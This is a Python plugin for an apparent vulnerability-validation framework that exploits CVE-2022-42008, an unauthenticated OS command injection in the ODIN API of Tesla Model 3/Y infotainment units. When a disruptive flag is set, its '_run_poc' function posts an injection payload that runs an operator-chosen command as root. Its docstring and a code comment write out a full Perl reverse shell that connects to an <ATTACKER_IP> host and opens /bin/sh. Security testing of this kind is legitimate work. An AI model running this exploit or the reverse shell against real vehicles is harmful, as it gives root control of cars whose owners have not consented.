#!/usr/bin/env python3
"""CVE-2022-42008 – Tesla ODIN command injection via HTTP POST to /api/v1/products.

Public PoC source: https://github.com/AnalyticETH/tesla-security-research
Technique (01-ROOT-SHELL-VIA-ODIN.md):
  ODIN listens on 192.168.90.100:8080 with endpoints including:
    POST /api/v1/products/current/commands
  The 'command-list' field in the JSON body is passed unsanitised to a shell.
  A crafted "MicTest-Input" task injects arbitrary commands that run as root
  under the 'log' account.

  Attacker sends:
    POST http://192.168.90.100:8080/api/v1/products/current/commands
    {
      "task": "TEST_DIGITAL-MICS_X_FUNCTIONAL-CHECK",
      "MicTest-Input": "0; id; perl -e '<REVERSE_SHELL>' &"
    }

Safety gate: is_disruptive=True.
  Plugin sends a benign probe (GET /api/v1/status) to confirm ODIN is present,
  then checks for the vulnerable endpoint structure.
  Full command injection payload only fires when allow_disruptive=true and
  'lab_command' param is supplied by the operator.
"""
from __future__ import annotations

import json
import urllib.error
import urllib.request

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 5,
    "cve": "CVE-2022-42008",
    "year": 2022,
    "domain": "network",
    "vendor_product": "Tesla Model 3/Y infotainment MCU",
    "component": "ODIN /api/v1/products/current/commands",
    "type": "OS command injection",
    "summary": (
        "ODIN (on-device firmware-update daemon) exposes an HTTP API on port 8080 "
        "with no authentication on the local interface.  The 'MicTest-Input' field "
        "of the TEST_DIGITAL-MICS task is passed without sanitisation to a shell, "
        "enabling root command injection."
    ),
    "source_url": "https://github.com/AnalyticETH/tesla-security-research",
    "requires_manual_review": True,
    "affected": [{"vendor": "Tesla", "product": "Tesla Model 3/Y MCU", "versions": [{"version": "<2021.32.10", "status": "affected"}]}],
    # Full reverse-shell payload from AnalyticETH 01-ROOT-SHELL-VIA-ODIN.md:
    # perl -e 'use Socket;$i="<ATTACKER_IP>";$p=1719;
    #   socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
    #   if(connect(S,sockaddr_in($p,inet_aton($i)))){
    #     open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
}

ODIN_BASE = "http://{host}:8080"
ODIN_STATUS_PATH = "/api/v1/status"
ODIN_COMMANDS_PATH = "/api/v1/products/current/commands"

# Benign probe command that verifies the endpoint structure without side-effects
_PROBE_PAYLOAD = {
    "task": "TEST_DIGITAL-MICS_X_FUNCTIONAL-CHECK",
    "MicTest-Input": "0",
}

# Injection payload template – operator supplies actual command via lab_command param
# Original PoC used Perl reverse shell; here we default to 'id' for readiness check
_INJECT_TEMPLATE = {
    "task": "TEST_DIGITAL-MICS_X_FUNCTIONAL-CHECK",
    "MicTest-Input": "0; {cmd} 2>&1 &",
}


def _http_get(url: str, timeout: int = 5) -> dict:
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return {"ok": True, "status": r.status, "body": r.read(512).decode(errors="replace")}
    except urllib.error.HTTPError as e:
        return {"ok": True, "status": e.code, "body": e.read(256).decode(errors="replace")}
    except Exception as exc:
        return {"ok": False, "status": None, "body": str(exc)}


def _http_post_json(url: str, payload: dict, timeout: int = 5) -> dict:
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        url, data=data, method="POST",
        headers={"Content-Type": "application/json", "Content-Length": str(len(data))},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"ok": True, "status": r.status, "body": r.read(1024).decode(errors="replace")}
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read(512).decode(errors="replace")
        except Exception:
            pass
        return {"ok": True, "status": e.code, "body": body}
    except Exception as exc:
        return {"ok": False, "status": None, "body": str(exc)}


def _run_poc(plugin):
    target = (plugin.params or {}).get("target_ip", "192.168.90.100")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))
    lab_command = (plugin.params or {}).get("lab_command", "id")

    base = ODIN_BASE.format(host=target)

    # Step 1: check ODIN status endpoint
    status = _http_get(base + ODIN_STATUS_PATH)
    evidence = {
        "cve": "CVE-2022-42008",
        "target": target,
        "odin_status_code": status["status"],
        "odin_reachable": status["ok"] and status["status"] is not None,
        "odin_status_body": status["body"][:200],
    }

    if not evidence["odin_reachable"]:
        evidence["detail"] = "ODIN HTTP API not reachable."
        return {"vulnerable": False, "evidence": evidence, "requires_manual_review": True}

    # Step 2: probe commands endpoint with benign payload
    probe = _http_post_json(base + ODIN_COMMANDS_PATH, _PROBE_PAYLOAD)
    evidence["commands_probe_status"] = probe["status"]
    evidence["commands_probe_body"]   = probe["body"][:300]
    endpoint_present = probe["ok"] and probe["status"] not in (None, 404, 403)

    if allow_disruptive and endpoint_present:
        inject_payload = {
            "task": _INJECT_TEMPLATE["task"],
            "MicTest-Input": _INJECT_TEMPLATE["MicTest-Input"].format(cmd=lab_command),
        }
        inject = _http_post_json(base + ODIN_COMMANDS_PATH, inject_payload, timeout=8)
        evidence["injection_payload"] = inject_payload
        evidence["injection_status"]  = inject["status"]
        evidence["injection_response"] = inject["body"][:400]
        # uid=0(root) in response indicates RCE
        evidence["rce_confirmed"] = "uid=0" in inject["body"] or "root" in inject["body"]
    else:
        evidence["injection_status"] = "not_attempted"

    vulnerable = endpoint_present
    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "AnalyticETH/tesla-security-research / 01-ROOT-SHELL-VIA-ODIN.md",
    }


class Poc71CVE202242008OdinCommandInjectionRceAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-NET-071"
    meta_poc_name   = "CVE-2022-42008 Tesla ODIN Command Injection RCE"
    meta_cve_id     = "CVE-2022-42008"
    meta_severity   = "Critical"
    meta_protocol   = "http"
    meta_target_os  = ["linux"]
    meta_required_params = ["target_ip"]
    meta_optional_params = ["lab_command"]
    meta_profiles   = ["network"]
    meta_source_url = "https://github.com/AnalyticETH/tesla-security-research"
    meta_attack_surface = "Tesla MCU ODIN HTTP API unauthenticated OS command injection"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return bool((self.params or {}).get("target_ip"))

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
